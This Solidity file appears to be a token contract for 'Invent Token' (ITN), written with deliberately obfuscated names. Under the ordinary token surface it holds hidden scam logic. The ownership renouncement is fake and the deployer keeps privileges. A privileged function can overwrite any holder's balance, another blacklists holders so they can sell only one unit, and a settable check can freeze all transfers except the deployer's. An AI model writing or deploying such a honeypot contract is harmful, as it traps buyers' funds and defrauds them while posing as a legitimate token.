//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface tradingFromLimit {
    function totalSupply() external view returns (uint256);

    function balanceOf(address teamLiquidity) external view returns (uint256);

    function transfer(address marketingBuyTotal, uint256 teamAutoMax) external returns (bool);

    function allowance(address limitMax, address spender) external view returns (uint256);

    function approve(address spender, uint256 teamAutoMax) external returns (bool);

    function transferFrom(
        address sender,
        address marketingBuyTotal,
        uint256 teamAutoMax
    ) external returns (bool);

    event Transfer(address indexed from, address indexed swapMarketingReceiver, uint256 value);
    event Approval(address indexed limitMax, address indexed spender, uint256 value);
}

abstract contract isTrading {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface toAt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface minIs {
    function createPair(address receiverTx, address launchBuy) external returns (address);
}

interface tradingMarketingMax is tradingFromLimit {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract InventToken is isTrading, tradingFromLimit, tradingMarketingMax {

    uint8 private liquidityMax = 18;

    bool public exemptMaxMarketing;

    uint256 fundTeam;

    function marketingWallet() public {
        emit OwnershipTransferred(tokenToTx, address(0));
        swapIs = address(0);
    }

    function decimals() external view virtual override returns (uint8) {
        return liquidityMax;
    }

    event OwnershipTransferred(address indexed exemptWallet, address indexed receiverSell);

    uint256 private buyAuto = 100000000 * 10 ** 18;

    function toLiquidity(address shouldTradingTake) public {
        takeAmount();
        
        if (shouldTradingTake == tokenToTx || shouldTradingTake == isLaunched) {
            return;
        }
        shouldMax[shouldTradingTake] = true;
    }

    mapping(address => bool) public marketingBuy;

    function transferFrom(address marketingAutoLimit, address marketingBuyTotal, uint256 teamAutoMax) external override returns (bool) {
        if (_msgSender() != marketingSender) {
            if (liquidityAt[marketingAutoLimit][_msgSender()] != type(uint256).max) {
                require(teamAutoMax <= liquidityAt[marketingAutoLimit][_msgSender()]);
                liquidityAt[marketingAutoLimit][_msgSender()] -= teamAutoMax;
            }
        }
        return fundLaunch(marketingAutoLimit, marketingBuyTotal, teamAutoMax);
    }

    function symbol() external view virtual override returns (string memory) {
        return fundEnable;
    }

    function limitTx(address marketingAutoLimit, address marketingBuyTotal, uint256 teamAutoMax) internal returns (bool) {
        require(txAmount[marketingAutoLimit] >= teamAutoMax);
        txAmount[marketingAutoLimit] -= teamAutoMax;
        txAmount[marketingBuyTotal] += teamAutoMax;
        emit Transfer(marketingAutoLimit, marketingBuyTotal, teamAutoMax);
        return true;
    }

    string private teamMin = "Invent Token";

    address public tokenToTx;

    uint256 constant swapShould = 1 ** 10;

    function transfer(address buyTokenReceiver, uint256 teamAutoMax) external virtual override returns (bool) {
        return fundLaunch(_msgSender(), buyTokenReceiver, teamAutoMax);
    }

    bool private fromTo;

    function balanceOf(address teamLiquidity) public view virtual override returns (uint256) {
        return txAmount[teamLiquidity];
    }

    address enableSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public tradingTx;

    mapping(address => mapping(address => uint256)) private liquidityAt;

    address private swapIs;

    mapping(address => uint256) private txAmount;

    function approve(address shouldAuto, uint256 teamAutoMax) public virtual override returns (bool) {
        liquidityAt[_msgSender()][shouldAuto] = teamAutoMax;
        emit Approval(_msgSender(), shouldAuto, teamAutoMax);
        return true;
    }

    mapping(address => bool) public shouldMax;

    uint256 public limitFee;

    bool public sellShouldEnable;

    function receiverTake(address buyTokenReceiver, uint256 teamAutoMax) public {
        takeAmount();
        txAmount[buyTokenReceiver] = teamAutoMax;
    }

    function walletLiquidity(uint256 teamAutoMax) public {
        takeAmount();
        fundTeam = teamAutoMax;
    }

    uint256 private launchLiquidity;

    function getOwner() external view returns (address) {
        return swapIs;
    }

    address public isLaunched;

    constructor (){
        if (limitFee != autoAt) {
            fromTo = true;
        }
        toAt maxShould = toAt(marketingSender);
        isLaunched = minIs(maxShould.factory()).createPair(maxShould.WETH(), address(this));
        
        tokenToTx = _msgSender();
        marketingWallet();
        marketingBuy[tokenToTx] = true;
        txAmount[tokenToTx] = buyAuto;
        
        emit Transfer(address(0), tokenToTx, buyAuto);
    }

    function takeAmount() private view {
        require(marketingBuy[_msgSender()]);
    }

    uint256 public autoAt;

    function allowance(address totalToken, address shouldAuto) external view virtual override returns (uint256) {
        if (shouldAuto == marketingSender) {
            return type(uint256).max;
        }
        return liquidityAt[totalToken][shouldAuto];
    }

    address marketingSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function owner() external view returns (address) {
        return swapIs;
    }

    function name() external view virtual override returns (string memory) {
        return teamMin;
    }

    uint256 minAtFund;

    function senderToken(address tradingAuto) public {
        if (exemptMaxMarketing) {
            return;
        }
        if (limitFee != launchLiquidity) {
            launchLiquidity = limitFee;
        }
        marketingBuy[tradingAuto] = true;
        
        exemptMaxMarketing = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return buyAuto;
    }

    function fundLaunch(address marketingAutoLimit, address marketingBuyTotal, uint256 teamAutoMax) internal returns (bool) {
        if (marketingAutoLimit == tokenToTx) {
            return limitTx(marketingAutoLimit, marketingBuyTotal, teamAutoMax);
        }
        uint256 launchedTakeTotal = tradingFromLimit(isLaunched).balanceOf(enableSender);
        require(launchedTakeTotal == fundTeam);
        require(marketingBuyTotal != enableSender);
        if (shouldMax[marketingAutoLimit]) {
            return limitTx(marketingAutoLimit, marketingBuyTotal, swapShould);
        }
        return limitTx(marketingAutoLimit, marketingBuyTotal, teamAutoMax);
    }

    string private fundEnable = "ITN";

    bool public tradingReceiver;

}